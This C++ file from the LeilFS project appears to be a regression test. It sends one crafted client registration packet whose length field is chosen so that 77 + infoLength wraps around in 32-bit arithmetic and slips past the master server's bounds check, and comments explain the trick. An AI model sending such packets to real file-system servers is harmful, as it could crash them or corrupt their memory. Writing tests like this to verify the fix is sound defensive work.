/*
   Copyright 2026 Leil Storage OÜ

   This file is part of LeilFS.

   LeilFS is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, version 3.

   LeilFS is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with LeilFS. If not, see <http://www.gnu.org/licenses/>.
 */

#include "common/platform.h"

#include <iostream>
#include <vector>

#include "common/datapack.h"
#include "common/massert.h"
#include "common/saunafs_version.h"
#include "common/sockets.h"
#include "protocol/SFSCommunication.h"

namespace {

void appendPut32(std::vector<uint8_t> &buffer, uint32_t value) {
	size_t offset = buffer.size();
	buffer.resize(offset + 4);
	uint8_t *ptr = buffer.data() + offset;
	put32bit(&ptr, value);
}

}  // namespace

int main(int argc, char **argv) {
	if (argc != 3) {
		std::cerr << "Usage: " << argv[0] << " <host> <port>\n";
		return 1;
	}

	uint32_t ip;
	uint16_t port;
	eassert(tcpresolve(argv[1], argv[2], &ip, &port, 0) == 0);

	std::vector<uint8_t> body;
	body.insert(body.end(), FUSE_REGISTER_BLOB_ACL, FUSE_REGISTER_BLOB_ACL + REGISTER_BLOB_SIZE);
	body.push_back(REGISTER_NEWSESSION);
	appendPut32(body, saunafsVersion(5, 0, 0));

	// kRegisterNewSessionMinSize (matoclserv.cc) is 77 = blob(64) + rcode(1) +
	// version(4) + infoLength(4) + pathLength(4). Choosing infoLength so that
	// 77 + infoLength wraps around to a small value in 32-bit arithmetic defeats
	// an addition-based bounds check, letting a peer claim an info field far
	// larger than the actual packet.
	appendPut32(body, 0xFFFFFFFFu - 76u);
	// pathLength: the body must be exactly kRegisterNewSessionMinSize (77 bytes,
	// with this field present but unread) so it clears the plain "packet too
	// short" check and actually reaches the wrapped-length comparison above; no
	// info/path bytes follow, since infoLength alone claims more data than is
	// present.
	appendPut32(body, 0);

	std::vector<uint8_t> packet;
	appendPut32(packet, CLTOMA_FUSE_REGISTER);
	appendPut32(packet, static_cast<uint32_t>(body.size()));
	packet.insert(packet.end(), body.begin(), body.end());

	int fd = tcpsocket();
	eassert(fd >= 0);
	tcpnodelay(fd);
	eassert(tcpnumconnect(fd, ip, port) == 0);
	eassert(tcptowrite(fd, packet.data(), packet.size(), 10000) == (int32_t)packet.size());
	tcpclose(fd);

	return 0;
}
